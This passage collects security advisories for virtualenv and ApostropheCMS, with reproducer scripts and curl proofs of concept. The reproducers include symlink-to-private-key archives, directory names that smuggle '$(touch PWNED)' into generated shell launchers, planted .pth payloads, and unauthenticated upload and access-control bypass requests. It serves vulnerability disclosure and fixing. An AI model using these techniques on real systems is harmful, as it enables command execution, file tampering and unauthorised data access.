subprocess.run([*make_archive, work / "writable.tar", "755"], check=True)
subprocess.run(["tar", "-tvf", work / "read-only.tar"], check=True)

# from here on an ordinary user: root's unlink never fails, so safe_delete's error handler would never run
os.setgroups([])
os.setgid(NOBODY)
os.setuid(NOBODY)
os.umask(0o022)


def unpack_next_to_key_and_run_virtualenv(label, home_name, archive_name, *options):
    home = work / home_name
    archive = work / archive_name
    key = home / "keys" / "deploy.pem"
    key.parent.mkdir(parents=True)
    key.write_text("PRIVATE KEY\n")
    key.chmod(0o400)
    subprocess.run(["tar", "-xf", archive], cwd=home, check=True)

    mode_before = stat.S_IMODE(key.stat().st_mode)
    command = ["virtualenv", "--no-periodic-update", "-q", *options, "venv"]
    # HOME is where virtualenv keeps its app-data; nobody's own, /nonexistent, cannot hold it
    result = subprocess.run(
        command,
        cwd=home / "proj",
        env={**os.environ, "HOME": str(home)},
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    mode_after = stat.S_IMODE(key.stat().st_mode)

    print(f"{label} {archive_name}, `{' '.join(command)}`: exit {result.returncode} {result.stdout.strip()}")
    print(f"{label} {key} mode {mode_before:#o} -> {mode_after:#o}")
    return mode_before, mode_after


control = unpack_next_to_key_and_run_virtualenv("CONTROL ", "home-control", "writable.tar")
default = unpack_next_to_key_and_run_virtualenv("OBSERVED", "home-default", "read-only.tar")
clear = unpack_next_to_key_and_run_virtualenv("OBSERVED", "home-clear", "read-only.tar", "--clear")

# check: the key lives outside the destination; virtualenv has no business changing its mode
print("BUG" if control == (0o400, 0o400) and default == (0o400, 0o777) and clear == (0o400, 0o777) else "OK")
```

**`repro.d/make_project_archive.py`**

```text
#!/usr/bin/env python3
import sys
import tarfile

archive_path = sys.argv[1]
python_folder_mode = int(sys.argv[2], 8)

with tarfile.open(archive_path, "w") as archive:
    python_folder = tarfile.TarInfo("proj/venv/bin/python")
    python_folder.type = tarfile.DIRTYPE
    python_folder.mode = python_folder_mode  # without the write bit, unlinking an entry inside it fails with EACCES
    archive.addfile(python_folder)

    link = tarfile.TarInfo("proj/venv/bin/python/entry")
    link.type = tarfile.SYMTYPE
    link.linkname = "../../../../keys/deploy.pem"  # the victim's key, beside the unpacked proj/
    archive.addfile(link)
```

## Impact

Permission recovery after a failed deletion can change an unrelated target's access bits. This requires the deletion
failure to occur on a link and the invoking user to have permission to change the target mode.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix leaves POSIX modes unchanged when deletion fails. Windows read-only recovery uses a native handle that
opens the entry itself without following reparse points and denies replacement until the attribute update finishes. It
rejects reparse points and clears only the read-only attribute. Concurrent replacement of parent directories remains
outside this protection.

Fix: [PR #3427](https://github.com/pypa/virtualenv/pull/3427).

## Known mitigation

Avoid recursively clearing destinations populated by another account. If cleanup fails, inspect the failing entry before
retrying with broader privileges.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-UK90QC27.

title: virtualenv: Generated POSIX console launchers interpret destination paths as shell syntax
desc:
## Summary

A destination path supplied to virtualenv can be interpreted as shell syntax by a generated POSIX console launcher. The
app-data seeder and pip delegate launcher generation to distlib but supply the interpreter path in a form that does not
preserve it as literal data in the shell wrapper.

## Affected area

POSIX console scripts generated by the app-data seeder or pip when the interpreter path requires a shell wrapper.
Windows executable launchers are not affected by this path.

## Attacker-controlled input

An attacker must influence the environment destination passed to virtualenv, and the user must subsequently run a
generated launcher. The attacker does not need to modify an installed executable or control the user's app-data cache.

## Affected code

The relevant 21.14.8 source is in
[ScriptMakerCustom](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/pip_install/base.py).

## Mechanism

The app-data seeder passes the environment's interpreter path through `enquote_executable()` to distlib's `ScriptMaker`.
It adds double quotes for a path with a space but does not escape shell expansions inside those quotes. When the path
has a space or the shebang exceeds 127 bytes, distlib emits a `#!/bin/sh` wrapper with a line shaped like
`'''exec' "<path>" "$0" "$@"`. The shell expands `$(...)` and backticks in that path when the launcher is run. The same
wrapper must also parse as Python, which exposes additional quote and backslash cases. Environment creation and
activation do not trigger the shell payload.

## Reproduction and evidence

The scanner created three environments: a control under `my -touch PWNED- project`, one under
`my $(touch PWNED) project`, and one under a path of more than 127 bytes ending in `$(touch${IFS}PWNED)`. Each was
created without producing `PWNED`. Running the generated `bin/pip --version` created `PWNED` in both attack cases; the
control created none. The long-path case reached the shell wrapper without a space. This reproduces execution by the
generated launcher, with the user's privileges, rather than during seeding.

The report dates the app-data seeder's distlib launcher integration to #1579, first released in 20.0.2.
[PR #3417](https://github.com/pypa/virtualenv/pull/3417) quotes the raw interpreter path for the POSIX wrapper and
repairs launchers written by the pip seeder. Pip's own distlib can write a vulnerable wrapper again during a later pip
install or upgrade; the proposed virtualenv fix does not change pip's vendored code. The maintainer-provided follow-up
review reports that later path separately.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Destination supplier
    participant V as virtualenv seeder
    participant D as distlib ScriptMaker
    participant S as Generated bin/pip
    participant U as User
    A->>V: path contains $(touch PWNED)
    V->>D: pass interpreter path with incomplete shell quoting
    D->>S: write /bin/sh wrapper
    Note over V,S: no payload runs during creation or activation
    U->>S: pip --version
    S->>S: shell expands path and runs touch
    S-->>U: PWNED appears with user's privileges
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-5DZVLGL1`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import shutil
import subprocess
from pathlib import Path

WORK = Path("/tmp/repro-console-script")

# The attacker's whole input: the name of a directory above the environment (a repository, a project folder).
DIRECTORY_NAMES = {
    "CONTROL": "my -touch PWNED- project",
    "OBSERVED": "my $(touch PWNED) project",
    # no space: distlib also picks the /bin/sh launcher once "#!<dest>/bin/python" is longer than 127 bytes
    "OBSERVED_LONG": "p" * 120 + "$(touch${IFS}PWNED)",
}

shutil.rmtree(WORK, ignore_errors=True)
pip_printed = {}
created_by_pip = {}
for label, name in DIRECTORY_NAMES.items():
    # the payload can hold no "/", so it touches a relative PWNED: each case gets its own empty working directory
    cwd = WORK / label / "cwd"
    venv = WORK / label / name / "venv"
    cwd.mkdir(parents=True)

    # set up: the user creates an environment there with default options (--no-periodic-update keeps it offline)
    subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", str(venv)], cwd=cwd, check=True)
    assert list(cwd.iterdir()) == [], "environment creation must not have created anything"

    # trigger: the user runs the seeded pip; argv is a list, so the only shell that reads the name is bin/pip's own
    pip = subprocess.run([venv / "bin" / "pip", "--version"], cwd=cwd, capture_output=True, text=True)
    pip_printed[label] = pip.stdout
    created_by_pip[label] = sorted(p.name for p in cwd.iterdir())

    launcher = (venv / "bin" / "pip").read_text().splitlines()
    print(f"{label}: directory name {name!r}")
    print(f"  bin/pip line 1: {launcher[0]}")
    print(f"  bin/pip line 2: {launcher[1]}")
    print(f"  bin/pip --version printed: {(pip.stdout + pip.stderr).strip()}")
    print(f"  files bin/pip created in the working directory: {created_by_pip[label]}")

# check: a directory name is data; starting pip must run pip and nothing else
control_ok = pip_printed["CONTROL"].startswith("pip ") and created_by_pip["CONTROL"] == []
attack_ran = created_by_pip["OBSERVED"] == ["PWNED"] and created_by_pip["OBSERVED_LONG"] == ["PWNED"]
print("BUG" if control_ok and attack_ran else "OK")
```

## Fix scope and remaining exposure

PR #3417 changes launcher generation by the app-data seeder and repairs POSIX shell wrappers after pip seeding. The
pip-seeder repair uses the same quoting rule and updates the installed RECORD hashes and sizes. It does not modify pip's
vendored distlib.

A later independent pip installation or upgrade can replace a corrected launcher with an affected one. Existing
launchers are not repaired by upgrading virtualenv alone. Recreate environments with the corrected virtualenv to
regenerate them, and use trusted destination paths. Recreation does not protect launchers subsequently rewritten by pip.
The follow-up review reports reproduction through the previous pip seeder and after a pip upgrade; those results are
attributed to the reviewer.

## Impact

Running an affected launcher can execute commands with the calling user's privileges. Classification: high, CVSS 7.8,
`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`, following the project's
[generated-script precedent](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The vector
assumes attacker-controlled path data and a user invoking the resulting launcher. No prior victim privileges are
required; successful command execution can affect the user's data and processes.

## Versions tested

The maintainer confirmed validation of the reported findings on release 21.14.8. The subsequent review
records reproduction on unfixed upstream/main; the affected launcher integration and dependency declarations are
unchanged from 21.14.8. The first affected release has not been established. Fixed in 21.14.9.

## Known mitigation

Use an environment destination chosen by a trusted user. For older releases, avoid generating
environments at destinations derived from untrusted input.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-5DZVLGL1.

title: virtualenv: Builtin creation follows linked environment directories
desc:
## Summary

The builtin creator accepts existing directory symlinks through ensure_dir() and writes environment files through those
directories. This permits writes outside the requested destination.

Anthropic's OSS Scanner reported this as `ANT-2026-MUFJEG11` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Directory preparation before environment files are created.

## Attacker-controlled input

Another account must be able to prepare linked entries below the chosen destination before creation. The invoking user
must have access to the linked destination. This does not require write access to the target itself under the other
account.

## Affected code

The relevant 21.14.8 source is in
[builtin creator](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/builtin/via_global_self_do.py),
[ensure_dir()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

The builtin creator calls `ensure_dir()` for `bin`, `lib`, and package directories. `ensure_dir()` accepts an existing
symlink to a directory because `exists()` follows it. Interpreter creation, seed installation, and activation-script
generation then write through that parent link. A final-file check cannot prevent a write through a linked parent.
`--clear` removes the planted tree first; ordinary creation over a prepared destination reaches it.

## Reproduction and evidence

The scanner's project tree contains `venv/bin -> ../../.local/bin` and a `.pth` file in the environment's package tree.
With the user's initially empty `~/.local/bin` first on `PATH`, `virtualenv venv` exited successfully and wrote
`python*`, `pip*`, and `activate*` into `~/.local/bin`. The marker was absent immediately after creation; a later
`pip --version` on the user's `PATH` loaded the seeded environment and the planted `.pth` code wrote the marker. A
second case began with the `bin` link resolving inside the environment; replacement of a planted package link during
seeding changed where it resolved, and writes again reached `~/.local/bin`.

The attacker must prepare entries in an existing destination. The `.pth` content is already attacker-controlled and
would run if the user used that environment directly; the added effect is creation-time writing or replacement outside
the requested tree and an executable on the user's `PATH` pointing at it. The scanner traces this default builtin path
to 20.0.0b1. [PR #3429](https://github.com/pypa/virtualenv/pull/3429) replaces linked directory components before
creation. Concurrent parent replacement remains a separate case.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared destination
    participant V as Builtin creator
    participant L as venv/bin symlink
    participant H as ~/.local/bin
    participant U as User
    A->>L: point to ../../.local/bin
    V->>L: ensure_dir accepts existing directory link
    V->>H: write python, pip and activate files through link
    V-->>U: creation reports success
    U->>H: run pip found on PATH
    H->>A: interpreter loads planted .pth
    A-->>U: marker created
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-MUFJEG11`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
from pathlib import Path

WORK = Path("/tmp/planted-bin-link")
shutil.rmtree(WORK, ignore_errors=True)


def user_creates_venv_in_checkout_then_runs_pip(home, make_checkout):
    local_bin = home / ".local/bin"
    user_env = {"HOME": str(home), "PATH": f"{local_bin}:{os.environ['PATH']}"}
    local_bin_before = set(os.listdir(local_bin))
    payload_marker = home / "PWNED"

    # the attacker's checkout arrives at ~/project
    subprocess.run([sys.executable, f"/tmp/repro.d/{make_checkout}", home / "project"], check=True)
    venv = home / "project/venv"
    print(f"CONTROL  venv/bin before the run resolves to {os.path.realpath(venv / 'bin')}")

    # default options; the flag only keeps the run off the network
    subprocess.run(["virtualenv", "--no-periodic-update", "--quiet", "venv"], cwd=home / "project", env=user_env, check=True)
    written = sorted(set(os.listdir(local_bin)) - local_bin_before)
    payload_ran_at_creation = payload_marker.exists()
    print(f"OBSERVED venv/bin after the run resolves to  {os.path.realpath(venv / 'bin')}")
    print(f"OBSERVED virtualenv wrote to {local_bin}: {written}")
    print(f"OBSERVED ~/PWNED exists after virtualenv: {payload_ran_at_creation}")

    # later, in another folder, the user runs pip
    pip = subprocess.run(["pip", "--version"], cwd=home, env=user_env, capture_output=True, text=True)
    print(f"OBSERVED pip --version: {(pip.stdout + pip.stderr).strip()}")
    print(f"OBSERVED ~/PWNED exists after pip: {payload_marker.exists()}")
    return written, payload_marker.exists() and not payload_ran_at_creation


print("--- checkout_with_bin_link.py: venv/bin -> ../../.local/bin")
home = WORK / "bin-link"
(home / ".local/bin").mkdir(parents=True)
written_1, pip_ran_payload_1 = user_creates_venv_in_checkout_then_runs_pip(home, "checkout_with_bin_link.py")

print("--- checkout_with_bin_link_staying_inside.py: venv/bin resolves inside venv/ until pip is seeded")
home = WORK / "bin-link-staying-inside"
(home / ".local/bin").mkdir(parents=True)
# python is linked before the bin link leads out, so the pip written to ~/.local/bin needs the user's own python there
(home / ".local/bin/python").symlink_to("/usr/local/bin/python3")
written_2, pip_ran_payload_2 = user_creates_venv_in_checkout_then_runs_pip(home, "checkout_with_bin_link_staying_inside.py")

# check: virtualenv must write nothing outside ~/project/venv, let alone a pip that runs the checkout's .pth
plain_link_followed = {"pip", "activate"} <= set(written_1) and pip_ran_payload_1
link_staying_inside_followed = {"pip", "activate"} <= set(written_2) and pip_ran_payload_2
print("---")
print(f"OBSERVED first checkout: pip, activate written to ~/.local/bin and pip ran the payload: {plain_link_followed}")
print(f"OBSERVED second checkout: pip, activate written to ~/.local/bin and pip ran the payload: {link_staying_inside_followed}")
print("BUG" if plain_link_followed or link_staying_inside_followed else "OK")
```

**`repro.d/checkout_with_bin_link.py`**

```text
import sys
from pathlib import Path

venv = Path(sys.argv[1]) / "venv"

# one per minor version: the attacker does not know which Python the user has
for minor in range(9, 20):
    site_packages = venv / f"lib/python3.{minor}/site-packages"
    site_packages.mkdir(parents=True)
    (site_packages / "payload.pth").write_text("import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\n")

# relative to a checkout at ~/project
(venv / "bin").symlink_to("../../.local/bin")
```

**`repro.d/checkout_with_bin_link_staying_inside.py`**

```text
import sys
from pathlib import Path

venv = Path(sys.argv[1]) / "venv"

site_packages = venv / "lib/py/site-packages"
site_packages.mkdir(parents=True)
(site_packages / "payload.pth").write_text("import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\n")
for minor in range(9, 20):
    (venv / f"lib/python3.{minor}").symlink_to("py")

# pip -> a folder 7 levels below venv/; the real pip folder the seeder puts in its place is only 4 levels below
(venv / "1/2/3/4/5/6/7").mkdir(parents=True)
(site_packages / "pip").symlink_to("../../../1/2/3/4/5/6/7")

# six levels up from venv/1/2/3/4/5/6/7 is venv/1; six levels up from ~/project/venv/lib/py/site-packages/pip is ~
(venv / "1/.local/bin").mkdir(parents=True)
(venv / "bin").symlink_to("lib/py/site-packages/pip" + "/.." * 6 + "/.local/bin")
```

## Impact

Creation can place or replace environment files outside the selected tree. The written bytes are environment-creation
output; arbitrary attacker-selected file contents are not established.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix removes pre-existing symbolic links and Windows junctions along executable and library directory paths.
Each replacement is created immediately, and an existing entry must be a real directory. A warning names each replaced
link or junction. Directories can still be replaced after preparation; this does not protect against concurrent tree
replacement.

Fix: [PR #3429](https://github.com/pypa/virtualenv/pull/3429).

## Known mitigation

Create environments in fresh directories beneath a parent controlled only by their owner. Do not reuse trees prepared by
another account.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-MUFJEG11.

title: ApostropheCMS: Unauthenticated resource exhaustion via pre-auth aposBigUpload processing in @apostrophecms/import-export
desc:
## Summary

A potential unauthenticated denial-of-service vulnerability exists in the chunked import upload path used by `@apostrophecms/import-export`.

The affected import API routes invoke:

`self.apos.http.bigUploadMiddleware()`

before the actual import handler performs its authentication check.

Because no `authorize` callback is supplied to `bigUploadMiddleware()`, unauthenticated requests can reach the `aposBigUpload` `start`, `chunk`, and `end` operations before the later `req.user` check rejects the import.

As a result, an unauthenticated remote attacker can create server-side upload state, write chunk data to upload storage, trigger temporary-file processing, and cause attacker-controlled cleanup operations before authentication is enforced.

## Affected Component

Package:

`@apostrophecms/import-export`

Confirmed affected version:

`3.6.2`

Potential earlier affected versions:

The issue may affect earlier 3.x releases in which the current big-upload-based import implementation is present. I have not yet fully verified the exact introduction version and recommend that the maintainers confirm the affected version range.

## Vulnerability Type

Primary:

**CWE-400 — Uncontrolled Resource Consumption**

Related:

**CWE-306 — Missing Authentication for Critical Function**

**CWE-770 — Allocation of Resources Without Limits or Throttling**

## Technical Details

The page import route registers the following middleware chain:

`packages/import-export/modules/@apostrophecms/import-export-page/index.js`

```javascript
importExportImport: [
  self.apos.http.bigUploadMiddleware(),
  async (req) => {
    return self.apos.modules['@apostrophecms/import-export']
      .import(req, self.__meta.name);
  }
]
```

No `authorize` callback is passed to `bigUploadMiddleware()`.

The `bigUploadMiddleware()` implementation explicitly supports an `authorize` callback and performs that authorization before processing the `aposBigUpload` protocol when supplied.

Without that callback, requests containing:

`aposBigUpload[type]=start`

`aposBigUpload[type]=chunk`

or

`aposBigUpload[type]=end`

are processed immediately.

The actual authentication check occurs later in:

`packages/import-export/lib/methods/import.js`

```javascript
async import(req, moduleName) {
  if (!req.user) {
    throw self.apos.error('forbidden');
  }
```

This means authentication occurs only after the chunked-upload middleware has already performed server-side work.

## Attack Flow

### 1. Start

An unauthenticated attacker submits an `aposBigUpload[type]=start` request.

The server generates an upload ID and stores attacker-supplied upload metadata, including the declared `chunks` count.

### 2. Chunk

The attacker can upload chunk data.

`bigUploadChunk()` copies attacker-controlled data into:

`/big-uploads/<id>-<n>-<chunk>`

### 3. End

The attacker sends an `aposBigUpload[type]=end` request.

`bigUploadEnd()` begins processing the upload and creates temporary files before invoking the downstream import handler.

Only after this processing completes does execution reach the later authentication check in `import()`.

### 4. Cleanup amplification

The attacker-controlled `chunks` value is also used by `bigUploadCleanupOne()`:

```javascript
for (const { chunks } of Object.values(bigUpload.files)) {
  for (let i = 0; (i < chunks); i++) {
    await ufs.remove(...);
  }
}
```

No small upper bound on the declared chunk count appears to be enforced at upload initialization.

This allows an unauthenticated attacker to increase the number of filesystem cleanup operations performed for an upload.

## Proof of Concept

The following reproduction was performed only against an isolated test environment.

### Start an upload without authentication

```bash
curl -s -X POST \
  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=start' \
  -H 'Content-Type: application/json' \
  --data '{"files":{"file":{"name":"evil.tar.gz","size":4,"type":"application/gzip","chunks":1}}}'
```

The server returns an upload ID despite the request having no authenticated session.

### Upload a chunk

```bash
printf 'PWN!' >/tmp/chunk.bin

curl -s -X POST \
  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=chunk&aposBigUpload[id]=<ID>&aposBigUpload[n]=0&aposBigUpload[chunk]=0' \
  -F 'chunk=@/tmp/chunk.bin;type=application/octet-stream'
```

The request succeeds and causes server-side upload storage to be used.

### Finalize the upload

```bash
curl -i -X POST \
  'http://localhost:3000/api/v1/@apostrophecms/page/importExportImport?aposBigUpload[type]=end&aposBigUpload[id]=<ID>'
```

Observed behavior:

* `start` returns HTTP 200 and an upload ID without authentication.
* `chunk` returns HTTP 200 and results in server-side chunk storage.
* `end` eventually reaches the downstream authentication check and is rejected.
* However, the server-side big-upload processing has already occurred before that authentication rejection.

In my isolated harness:

* `chunks=1` resulted in one cleanup removal attempt.
* `chunks=50` resulted in 50 cleanup removal attempts.

This demonstrates that the attacker-controlled chunk count directly influences server-side cleanup work.

## Security Impact

The vulnerability allows an unauthenticated remote attacker to cause server-side storage and filesystem operations that should only be reachable by authorized import users.

Possible consequences include:

* Consumption of upload and temporary storage.
* Creation of server-side upload state by unauthenticated users.
* Repeated filesystem I/O.
* Cleanup amplification based on attacker-controlled chunk counts.
* Potential service degradation or denial of service when the attack is repeated or sufficiently amplified.

## Root Cause

Authentication is enforced in the downstream import handler rather than before the chunked-upload middleware.

The middleware itself already supports an `authorize` callback specifically for preventing unauthorized use of the big-upload functionality.

## Suggested Remediation

Require authentication before any `aposBigUpload` operation is processed.

For example:

* Pass an appropriate `authorize` callback to `bigUploadMiddleware()` on all import routes.
* Reject unauthenticated users before `start`, `chunk`, or `end`.
* Enforce reasonable limits on declared chunk counts.
* Validate declared size against actual uploaded data.
* Introduce per-user and global storage/rate limits.
* Ensure temporary files are removed when downstream processing fails.
* Add regression tests confirming that anonymous `start`, `chunk`, and `end` requests are rejected before upload state or files are created.

Relevant reviewed commit:

`d3ff8c9bb001be1acf7fdc3f035190250ac64b45`

## Researcher Credit

**Kai Zhi**

GitHub:

**https://github.com/kaizhi888**

title: ApostropheCMS sanitize-html: unbounded recursion when re-sanitizing the fallback of a discarded iframe (stack overflow, nestingLimit not enforced)
desc:
### Summary

Since 2.18.0, when an `<iframe>` is not allowed and `disallowedTagsMode` is `'discard'` (the defaults),
its raw-text content is re-sanitized by a recursive call to `sanitizeHtml(text, options)` (the change
from #5564, fixing #5550). The recursion has no bound and starts each nested call with a fresh state.
Two consequences, both absent from 2.17.7 and 2.17.4:

1. A few kilobytes of unclosed `<iframe>` tags throw `RangeError: Maximum call stack size exceeded`
   with the default options. Any application that sanitizes untrusted HTML with 2.18.0 can be made to
   throw on a small crafted input.
2. `nestingLimit` is not enforced across a discarded iframe: each nested iframe restarts the depth
   count at zero, so the output can be nested arbitrarily deep regardless of the configured limit.

### Affected versions

- 2.18.0 (the current `latest`), and the `main` branch at the time of writing (the recursive call is
  still in `packages/sanitize-html/index.js`, in the `ontext` handler, branch
  `tag === 'iframe' && !tagAllowed(tag) && options.disallowedTagsMode === 'discard'`).
- Not affected: 2.17.7 and 2.17.4 (tested with the same inputs below).

Tested with Node.js v26.7.0.

### Reproduction 1: stack overflow with the default options

```js
const sanitizeHtml = require('sanitize-html');

// with 2.18.0:
sanitizeHtml('<iframe>'.repeat(1000));  // 8,000 chars: returns ''
sanitizeHtml('<iframe>'.repeat(2000));  // 16,000 chars: throws RangeError: Maximum call stack size exceeded
sanitizeHtml('<iframe>'.repeat(20000)); // 160,000 chars: throws RangeError: Maximum call stack size exceeded
```

Results:

| input | 2.17.4 | 2.17.7 | 2.18.0 |
|---|---|---|---|
| `'<iframe>'.repeat(1000)` | ok | ok | ok |
| `'<iframe>'.repeat(2000)` | ok | ok | RangeError |
| `'<iframe>'.repeat(20000)` | ok | ok | RangeError |

The threshold depends on the remaining stack, so it is lower when `sanitizeHtml` is called from an
already deep call stack (for example inside a server-side rendering pass).

### Reproduction 2: `nestingLimit` is bypassed

```js
const sanitizeHtml = require('sanitize-html');

const input = ('<iframe>' + '<b>'.repeat(3)).repeat(50) + 'x';
const out = sanitizeHtml(input, { allowedTags: ['b'], nestingLimit: 3 });
// maximum nesting depth of <b> in `out`:
//   2.17.4: 2    2.17.7: 0 (fallback escaped as text)    2.18.0: 150
```

Without an iframe, the same options cap the output at three nested `<b>` in all three versions. With
`k` repetitions of `'<iframe>' + '<b>'.repeat(3)`, 2.18.0 returns `3 * k` nested `<b>` (measured for
k = 1, 5, 50: depth 3, 15, 150).

### Cause

In 2.18.0 the `ontext` handler does:

```js
} else if (
  tag === 'iframe' &&
  !tagAllowed(tag) &&
  options.disallowedTagsMode === 'discard'
) {
  result += sanitizeHtml(text, options);
}
```

Because htmlparser2 treats `<iframe>` as a raw-text element, the text of an unclosed iframe is the whole
remainder of the input; re-parsing it can meet another unclosed `<iframe>`, and so on, one stack frame
(and one full re-parse) per iframe. The nested call also starts with its own `depth`, so tags inside the
fallback are not counted against `nestingLimit` together with the enclosing tags.

### Possible directions

Not a patch, only what would close both effects: bound the recursion (or process the fallback without
recursing), and carry the current depth into the nested sanitization so that `nestingLimit` applies to
the whole output.

title: ApostropheCMS: Import API bypasses publication roles for protected content
desc:
## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. 

## Import API bypasses publication roles for protected content

The import gate in canImportOrExport() checks the type's import configuration and view permission. The write helpers then call document-manager insert/update directly, including operations on published variants. We did not find the normal publish permission check or beforePublish transition in these helpers. Core permissions intentionally distinguish editRole and publishRole, and the ordinary publication lifecycle enforces that distinction.

The reported security boundary is a content type that an editor may edit but whose publication is reserved for a stronger role. Direct public-state changes through import must enforce the same publication authority. The original report describes unauthorized creation, replacement, or removal of published content under that configuration.

Suggested remediation: centralize authorization for import writes; require publish permission for every non-autopublished published variant, authorize each concrete target, and preflight the complete import before persistent changes. Preserve authorized draft imports and the intended behavior of autopublished types.

Source references:
- [Import write helpers](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)
- [Import permission gate](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/index.js)
- [Core role distinctions](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/permission/index.js)
- [Core insert/update/publication permission hooks](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/doc/index.js)

## Coordination

Vivek R / Winfunc
Original reporting team: Mufeed VH / Winfunc

title: ApostropheCMS: Stored XSS via Unescaped Widget Style Attribute Serialization
ApostropheCMS: GET /api/v1/@apostrophecms/page/:id bypasses viewRole restriction and exposes viewPermission-gated fields to lower-privileged users
desc:
### Summary
The `getOne` REST endpoint for pages does not apply `viewRole` type-level restrictions
or `viewPermission` field-level redaction. An editor-level user who knows a document
`_id` can read the full content of admin-only pages and their privileged fields, while
the `getAll` endpoint correctly enforces both restrictions.

### Details
**Finding 3 — viewRole bypass:**
`modules/@apostrophecms/page/index.js` exposes `getRestQuery(req, omitPermissionCheck =
false)`. The `getAll` path calls `publicApiCheckAsync` and threads the full query builder
pipeline including `viewRole` filtering. The `getOne` path uses a divergent code path
that skips this pipeline.

A page type declared with `viewRole: 'admin'` is inaccessible via `GET
/api/v1/@apostrophecms/page?type=secretPage` (returns 403 to an editor) but is fully
returned by `GET /api/v1/@apostrophecms/page/:id:en:published` to the same editor.

**Finding 4 — viewPermission field leak:**
Fields decorated with `viewPermission: { action: 'edit', type: '@apostrophecms/page' }`
are stripped by `removeForbiddenFields` in the `getAll` path but are returned verbatim
in `getOne`. An editor who knows any document `_id` can read all
`viewPermission`-restricted fields.

### PoC
```bash
# Log in as editor, get session jar
EDITOR_JAR="..."

# getAll — correctly blocked
curl -b "$EDITOR_JAR" \
  "http://TARGET/api/v1/@apostrophecms/page?type=secretPage"
# → 403 Forbidden

# getOne — bypassed, returns full document including viewPermission fields
curl -b "$EDITOR_JAR" \
  "http://TARGET/api/v1/@apostrophecms/page/ADMIN_PAGE_ID:en:published"
# → 200 OK, full doc including secretField value
```

### Impact
Editors can read the full content of any page — including those restricted to admins via
`viewRole` — if they know or can guess the `_id`. Sensitive field values gated by
`viewPermission` are also fully exposed. This breaks the content access control model
for any site using these decorators.

title: ApostropheCMS: Archive duplicate continuation lets contributors overwrite published content
desc:
## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.

## Archive duplicate continuation permits unauthorized published-content replacement

The overrideDuplicates() continuation still accepts client-supplied replacement choices, rather than binding them to a server-maintained, user-owned duplicate analysis. The replacement and write helpers do not establish a single canonical resource identity and authorization context before the update. This leaves the reported gap between draft editing authority and the published target selected for replacement unresolved at source level.

